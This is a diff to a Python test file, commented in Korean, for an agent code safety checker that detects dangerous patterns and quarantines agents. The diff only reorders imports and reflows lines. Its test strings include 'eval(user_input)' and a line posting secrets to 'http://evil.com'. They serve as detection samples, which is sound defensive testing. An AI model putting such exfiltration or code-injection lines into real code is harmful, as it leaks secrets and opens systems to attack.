@@ -5,23 +5,23 @@ Tests for Evolution Safety
 """
 
 import asyncio
-import pytest
-import tempfile
-import shutil
-from pathlib import Path
-from datetime import datetime
-
-import sys
 import os
+import shutil
+import sys
+import tempfile
+from datetime import datetime
+from pathlib import Path
+
+import pytest
 
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "src"))
 
 from evolution.safety import (
     EvolutionSafety,
-    SafetyConfig,
-    ThreatLevel,
     PatternType,
+    SafetyConfig,
     SafetyViolation,
+    ThreatLevel,
 )
 
 
@@ -34,9 +34,7 @@ class TestEvolutionSafety:
         self.temp_dir = Path(tempfile.mkdtemp())
 
         # 테스트용 설정
-        self.config = SafetyConfig(
-            max_memory_kb=6.5, max_cpu_percent=50.0, auto_quarantine=True
-        )
+        self.config = SafetyConfig(max_memory_kb=6.5, max_cpu_percent=50.0, auto_quarantine=True)
 
         # Safety 객체 생성
         self.safety = EvolutionSafety(self.config)
@@ -71,9 +69,7 @@ class DataProcessor:
 """
 
         # When: 코드 안전성 검사
-        is_safe, violations = await self.safety.check_agent_code(
-            "test_agent", safe_code
-        )
+        is_safe, violations = await self.safety.check_agent_code("test_agent", safe_code)
 
         # Then: 안전함으로 판정
         assert is_safe is True
@@ -91,9 +87,7 @@ def process():
 """
 
         # When: 코드 검사
-        is_safe, violations = await self.safety.check_agent_code(
-            "test_agent", dangerous_code
-        )
+        is_safe, violations = await self.safety.check_agent_code("test_agent", dangerous_code)
 
         # Then: 위험으로 판정
         assert is_safe is False
@@ -115,17 +109,13 @@ def malicious_function():
 """
 
         # When: 코드 검사
-        is_safe, violations = await self.safety.check_agent_code(
-            "malicious_agent", malicious_code
-        )
+        is_safe, violations = await self.safety.check_agent_code("malicious_agent", malicious_code)
 
         # Then: 위험으로 판정 및 격리
         assert is_safe is False
         assert len(violations) > 0
         assert any(v.threat_level == ThreatLevel.CRITICAL for v in violations)
-        assert any(
-            v.pattern_type == PatternType.PRIVILEGE_ESCALATION for v in violations
-        )
+        assert any(v.pattern_type == PatternType.PRIVILEGE_ESCALATION for v in violations)
 
     @pytest.mark.asyncio
     async def test_data_exfiltration_detection(self):
@@ -145,9 +135,7 @@ def send_data():
 """
 
         # When: 코드 검사
-        is_safe, violations = await self.safety.check_agent_code(
-            "exfil_agent", exfiltration_code
-        )
+        is_safe, violations = await self.safety.check_agent_code("exfil_agent", exfiltration_code)
 
         # Then: 위험으로 판정
         assert is_safe is False
@@ -168,9 +156,7 @@ def safe_function():
 """
 
         # When: 코드 검사
-        is_safe, violations = await self.safety.check_agent_code(
-            "import_test", unsafe_import_code
-        )
+        is_safe, violations = await self.safety.check_agent_code("import_test", unsafe_import_code)
 
         # Then: 위험으로 판정
         assert is_safe is False
@@ -188,9 +174,7 @@ def safe_function():
         }
 
         # When: 런타임 검사
-        is_safe = await self.safety.check_runtime_behavior(
-            "normal_agent", normal_metrics
-        )
+        is_safe = await self.safety.check_runtime_behavior("normal_agent", normal_metrics)
 
         # Then: 안전함
         assert is_safe is True
@@ -204,9 +188,7 @@ def safe_function():
         }
 
         # When: 런타임 검사
-        is_safe = await self.safety.check_runtime_behavior(
-            "dangerous_agent", dangerous_metrics
-        )
+        is_safe = await self.safety.check_runtime_behavior("dangerous_agent", dangerous_metrics)
 
         # Then: 위험함
         assert is_safe is False
@@ -228,18 +210,14 @@ def safe_function():
         ]
 
         # When: 에이전트 격리
-        result = await self.safety.quarantine_agent(
-            "quarantine_test", dangerous_code, violations
-        )
+        result = await self.safety.quarantine_agent("quarantine_test", dangerous_code, violations)
 
         # Then: 격리 성공
         assert result is True
         assert self.safety.is_quarantined("quarantine_test")
 
         # 격리 파일 생성 확인
-        quarantine_files = list(
-            self.safety.quarantine_dir.glob("quarantine_test_*.json")
-        )
+        quarantine_files = list(self.safety.quarantine_dir.glob("quarantine_test_*.json"))
         assert len(quarantine_files) > 0
 
     @pytest.mark.asyncio
@@ -300,23 +278,17 @@ def safe_function():
         """위협 레벨 평가 테스트"""
         # Critical patterns
         critical_code = "eval(user_input)"
-        threat_level = self.safety._assess_threat_level(
-            PatternType.CODE_INJECTION, critical_code
-        )
+        threat_level = self.safety._assess_threat_level(PatternType.CODE_INJECTION, critical_code)
         assert threat_level == ThreatLevel.CRITICAL
 
         # High threat patterns
         high_code = "requests.post('http://evil.com', data=secrets)"
-        threat_level = self.safety._assess_threat_level(
-            PatternType.DATA_EXFILTRATION, high_code
-        )
+        threat_level = self.safety._assess_threat_level(PatternType.DATA_EXFILTRATION, high_code)
         assert threat_level == ThreatLevel.HIGH
 
         # Medium threat patterns
         medium_code = "while condition: process()"
-        threat_level = self.safety._assess_threat_level(
-            PatternType.INFINITE_LOOP, medium_code
-        )
+        threat_level = self.safety._assess_threat_level(PatternType.INFINITE_LOOP, medium_code)
         assert threat_level == ThreatLevel.MEDIUM
 
     def test_pattern_extraction(self):
@@ -336,18 +308,10 @@ def safe_function():
     def test_mitigation_suggestions(self):
         """완화 방안 제안 테스트"""
         # Test mitigation for different pattern types
-        assert "loop termination" in self.safety._get_mitigation(
-            PatternType.INFINITE_LOOP
-        )
-        assert "resource limits" in self.safety._get_mitigation(
-            PatternType.RESOURCE_EXHAUSTION
-        )
-        assert "network operations" in self.safety._get_mitigation(
-            PatternType.DATA_EXFILTRATION
-        )
-        assert "system calls" in self.safety._get_mitigation(
-            PatternType.PRIVILEGE_ESCALATION
-        )
+        assert "loop termination" in self.safety._get_mitigation(PatternType.INFINITE_LOOP)
+        assert "resource limits" in self.safety._get_mitigation(PatternType.RESOURCE_EXHAUSTION)
+        assert "network operations" in self.safety._get_mitigation(PatternType.DATA_EXFILTRATION)
+        assert "system calls" in self.safety._get_mitigation(PatternType.PRIVILEGE_ESCALATION)
 
     @pytest.mark.asyncio
     async def test_resource_pattern_detection(self):
@@ -371,9 +335,7 @@ def safe_function():
 
         # Then: 리소스 사용 위반 탐지
         assert len(violations) > 0
-        assert any(
-            v.pattern_type == PatternType.RESOURCE_EXHAUSTION for v in violations
-        )
+        assert any(v.pattern_type == PatternType.RESOURCE_EXHAUSTION for v in violations)
 
     def test_safety_score_calculation(self):
         """안전성 점수 계산 테스트"""
